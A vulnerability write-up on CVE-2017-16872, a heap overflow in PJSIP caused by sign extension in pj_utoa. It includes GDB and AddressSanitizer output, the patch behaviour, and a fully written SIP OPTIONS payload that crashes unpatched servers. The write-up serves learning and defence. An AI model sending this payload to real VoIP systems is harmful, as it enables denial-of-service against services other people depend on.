# CVE-2017-16872

This vulnerability was found by Youngsung Kim from LINE. It's a pretty interesting bug regarding the type conversions between different number
datatypes. They discovered that PJSIP was doing some improper type conversions on information that could be manipulated by a remote request. Here is
how it works.

# The vulnerability

The vulnerability is pretty well explained [here](https://engineering.linecorp.com/en/blog/buffer-overflow-in-pjsip-a-voip-open-source-library), but
I'll go over the main points so that we can understand how an exploit might work.

The issue stems from the converstion from an `int` to an `unsigned long`. When this kind of type conversion happens, the process does something called
a sign extension that essentially just extends the value to fill the space of an unsigned long. For example, a value like `0xFFFFFFFF` or `-1` as an
`int` would sign extend to `0xFFFFFFFFFFFFFFFF` as a long. This would normally not be a problem, but the `pj_utoa()` custom function expects an
unsigned long and creates the string based off an unsigned long. A normal 4-byte integer would normally max out at 10 bytes in string form, but the
sign extension has doubled the size of the string to 20 bytes. At the beginning of the function, the `len_required` value gets set in order to
allocate the proper size heap block to get the job done. This value gets set to the length of the data + 9 + 9 + 16 totalling 34 bytes past the data
in the request. This would not be a problem if it was only doing one utoa function, but the program runs 2. One for the `CSeq` number and one for the
`port`. As a result, you have 40 possible bytes that could be allocated to a 34 byte space creating a buffer overflow.

So why does this matter? Well the remote requester has control over those numbers as they get sent in, so they arbitrarily create these buffer
overflows. This is what we will do with the exploit. That's about as much detail as I'll go into for the vulnerability, since it's explained much
better in the original article linked up above. 

# The exploit

Building this exploit is relatively finicky. Since the heap allocator for PJ was custom built, it's hard to get automated tools to do the heap
checking. As a result, I did most of the exploit debugging in GDB and manually looked at the values to see how they were being modified.
[This](https://issues-archive.asterisk.org/ASTERISK-27319) ticket gave me a good starting point for looking into these values. Basically the goal of
the exploit is to modify the payload so that it fills the block of space that gets allocated to the to the heap, but not so much that it forces the
heap allocator to allocate a larger chunk. The way to test this is to first get the `len_required` variable which is based on the length of the
request. Then get the distance between pool chunks made by the allocator. If the pjsip program is compiled with debugging symbols, you can directly
reference the variables in GDB to get the proper size. Sadly, since this is a custom heap implementation, automated tools like pwndbg's `heap`
functionality don't work. This is what that looks like:
```
pwndbg> p pool->block_list->next->end - pool->block_list->next->cur
$1 = 1488
pwndbg> p len_required
$3 = 1487
```
Make sure you get to the point in the `create_tsx_key_2543` function that actually sets the value of this variable to the size of the request.

I made the payload the perfect size to that it's just small enough to not allocate a larger block. So now, I have a payload that fits in the proper
size, but I have no idea how this actually overflows the buffer. Turns out the program just calls the `pj_utoa()` function multiple times and appends
those values to the end of the string separated by a `":"` with some `"$"` characters separating parts of it. So the way it would look in the heap is
something like `data:cseq:port\0`. And if we look at the payload in memory, you can see exactly that:
```
pwndbg> x/s 0x5a70ff9beff0 -0x30   ### The is the point in memory at the end of the heap block
0x5a70ff9befc0:	'A' <repeats 13 times>, "$18446744073709551614$$a$4:18446744073709551614$"
```
So now the heap has been overwritten, but to really understand this exploit to see what is actually happening we need to look at what is being
overwritten. I used the method above to look at the memory before and after the buffer overflow to see what is being overwritten:;
```
### BEFORE THE OVERFLOW
pwndbg> print *pool->block_list->next
$1 = {
  prev = 0x6060345810f0,
  next = 0x606034581120,
  buf = 0x6060345820d8 "\240\020X4``",
  cur = 0x606034583a20 "",
  end = 0x606034583ff0 "0@X4``"
}
pwndbg> x/10xg 0x606034583ff0 - 0x20 
0x606034583fd0:	0x0000000000000040	0x0000000000000050
0x606034583fe0:	0x0000606034583f40	0x0000000000000003
0x606034583ff0:	0x0000606034584030	0x0000000000000211 ## This is the beginning of the block

### AFTER THE OVERFLOW
pwndbg> x/10xg 0x606034583ff0 - 0x20
0x606034583fd0:	0x3730343437363434	0x3631353539303733
0x606034583fe0:	0x3a34246124243431	0x3434373634343831
0x606034583ff0:	0x3535393037333730	0x0000002434313631 ## Looks like the 0x211 and prev value got overwritten
```
So it looks like the 0x211 that was in the next block of the heap was overwritten. This turns out to be the size value for the object in memory. Since
this has been overwritten, it will be improperly referenced if it is ever used later in the program. Sadly (for me writing the exploit), this object
was only referenced when the heap attempts to be reset in the `pj_pool_reset()` function. This function just goes through the objects in the heap and
tries to free them. Obviously since the size value is set way too high, an error will occur. This is how we get a DoS. Since the heap overflow raises an
error, the entire program stops. This is what that looks like:
```
Send this payload:
b'OPTIONS sip:3 SIP/2.0\nf: <sip:2>\nt: <sip:1>\ni: a\nCSeq: 18446744073709551614 <AAAAAA...1451 times...> \nv: SIP/2.0/U 4:18446744073709551614\n\n'

Get this effect:
double free or corruption (!prev)
Aborted (core dumped)
```

Compiling the program with address sanitizer enabled a detection of the heap buffer overflow. Here is the output of that:
```
=================================================================
==7==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x625000004840 at pc 0x6473f063c542 bp 0x725cd8bfe980 sp 0x725cd8bfe978
WRITE of size 1 at 0x625000004840 thread T2
    #0 0x6473f063c541 in pj_utoa_pad ../src/pj/string.c:339
    #1 0x6473f063c48c in pj_utoa ../src/pj/string.c:325
    #2 0x6473f0383dc5 in create_tsx_key_2543 ../src/pjsip/sip_transaction.c:338
    #3 0x6473f0384472 in pjsip_tsx_create_key ../src/pjsip/sip_transaction.c:419
    #4 0x6473f0385553 in mod_tsx_layer_on_rx_request ../src/pjsip/sip_transaction.c:802
    #5 0x6473f03417be in pjsip_endpt_process_rx_data ../src/pjsip/sip_endpoint.c:887
    #6 0x6473f03420cc in endpt_on_rx_msg ../src/pjsip/sip_endpoint.c:1037
    #7 0x6473f035c8aa in pjsip_tpmgr_receive_packet ../src/pjsip/sip_transport.c:1962
    #8 0x6473f035f006 in udp_on_read_complete ../src/pjsip/sip_transport_udp.c:171
    #9 0x6473f05fcbcc in ioqueue_dispatch_read_event ../src/pj/ioqueue_common_abs.c:605
    #10 0x6473f06021a4 in pj_ioqueue_poll ../src/pj/ioqueue_select.c:994
    #11 0x6473f0340f04 in pjsip_endpt_handle_events2 ../src/pjsip/sip_endpoint.c:742
    #12 0x6473f028d1ab in pjsua_handle_events ../src/pjsua-lib/pjsua_core.c:1988
    #13 0x6473f02870fb in worker_thread ../src/pjsua-lib/pjsua_core.c:704
    #14 0x6473f0604e51 in thread_main ../src/pj/os_core_unix.c:541
    #15 0x725cddfdcfa2 in start_thread /build/reproducible-path/glibc-2.28/nptl/pthread_create.c:486
    #16 0x725cdcab506e in clone (/lib/x86_64-linux-gnu/libc.so.6+0xf906e)

0x625000004840 is located 0 bytes to the right of 8000-byte region [0x625000002900,0x625000004840)
allocated by thread T0 here:
    #0 0x725cdd2e9330 in __interceptor_malloc (/usr/lib/x86_64-linux-gnu/libasan.so.5+0xe9330)
    #1 0x6473f064128c in default_block_alloc ../src/pj/pool_policy_malloc.c:46
    #2 0x6473f061c6dc in pj_pool_create_block ../src/pj/pool.c:61
    #3 0x6473f061ca2b in pj_pool_allocate_find ../src/pj/pool.c:138
    #4 0x6473f061c454 in pj_pool_alloc ../include/pj/pool_i.h:62
    #5 0x6473f061c48d in pj_pool_calloc ../include/pj/pool_i.h:69
    #6 0x6473f035e955 in pj_pool_zalloc ../../pjlib/include/pj/pool.h:485
    #7 0x6473f035ea2b in init_rdata ../src/pjsip/sip_transport_udp.c:98
    #8 0x6473f03624c8 in transport_attach ../src/pjsip/sip_transport_udp.c:830
    #9 0x6473f03627f4 in pjsip_udp_transport_attach2 ../src/pjsip/sip_transport_udp.c:879
    #10 0x6473f028e6d4 in pjsua_transport_create ../src/pjsua-lib/pjsua_core.c:2312
    #11 0x6473f021f65a in app_init ../src/pjsua/pjsua_app.c:1598
    #12 0x6473f02217b0 in pjsua_app_init ../src/pjsua/pjsua_app.c:1888
    #13 0x6473f02167b4 in main_func ../src/pjsua/main.c:108
    #14 0x6473f0607e66 in pj_run_app ../src/pj/os_core_unix.c:1952
    #15 0x6473f021683f in main ../src/pjsua/main.c:129
    #16 0x725cdc9e009a in __libc_start_main ../csu/libc-start.c:308

Thread T2 created by T0 here:
    #0 0x725cdd250db0 in __interceptor_pthread_create (/usr/lib/x86_64-linux-gnu/libasan.so.5+0x50db0)
    #1 0x6473f060522d in pj_thread_create ../src/pj/os_core_unix.c:634
    #2 0x6473f02887be in pjsua_init ../src/pjsua-lib/pjsua_core.c:1118
    #3 0x6473f021e23e in app_init ../src/pjsua/pjsua_app.c:1356
    #4 0x6473f02217b0 in pjsua_app_init ../src/pjsua/pjsua_app.c:1888
    #5 0x6473f02167b4 in main_func ../src/pjsua/main.c:108
    #6 0x6473f0607e66 in pj_run_app ../src/pj/os_core_unix.c:1952
    #7 0x6473f021683f in main ../src/pjsua/main.c:129
    #8 0x725cdc9e009a in __libc_start_main ../csu/libc-start.c:308

SUMMARY: AddressSanitizer: heap-buffer-overflow ../src/pj/string.c:339 in pj_utoa_pad
Shadow bytes around the buggy address:
  0x0c4a7fff88b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c4a7fff88c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c4a7fff88d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c4a7fff88e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c4a7fff88f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x0c4a7fff8900: 00 00 00 00 00 00 00 00[fa]fa fa fa fa fa fa fa
  0x0c4a7fff8910: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c4a7fff8920: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c4a7fff8930: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c4a7fff8940: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c4a7fff8950: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==7==ABORTING
```

# The patch

Since this issue was rampant throughout the codebase of pjsip, the patch was simply to validate the size of the request header values so that they fit
into 9 byte areas that they were meant to fit in. Here's the error you get when you try to run the exploit on the patched version (doesn't crash):
```
03:29:41.506           sip_parser.c !Error parsing '18446744073709551614': String value was greater than the maximum allowed value.
03:29:41.506           sip_parser.c  Error parsing '18446744073709551614': String value was greater than the maximum allowed value.
```
One extra thing that the developers could do is make sure the type of values going into functions are always the same as the value types being used 
within the function. This type confusion could easily cause more vulnerabilities in the future.

# Going further

This is about as far as this writeup will go. There is one thing that could be explored further and that is the `prev` pointer of that heap object.
Since the exploit successfully overwrites that, it is theoretically possible to put a value that points somewhere else in the program memory causing
an unknown effect. The reason I won't go into it is because sending the right value would require breaking/leaking ASLR in the program, which is
outside the scope of this vulnerability. 

# What can we learn from this

This is a great heap vulnerability to learn from. Since this is a custom heap implementation, it required me to dive into the heap values and look at
the raw memory to see what was really going on. Understanding heap corruption is vital to modern day exploitation and CTF challenges don't really do
it justice. This is mainly because heap corruption in the real world rarely leads to an actual full chain get-a-shell exploit. Instead, CTF challenges
have to alter the challenge to make it super easy to modify the heap. This implementation is a great practice for real-world vulnerabilities since
it's all custom built and requires you too look at how it really works to build any kind of exploit for it.
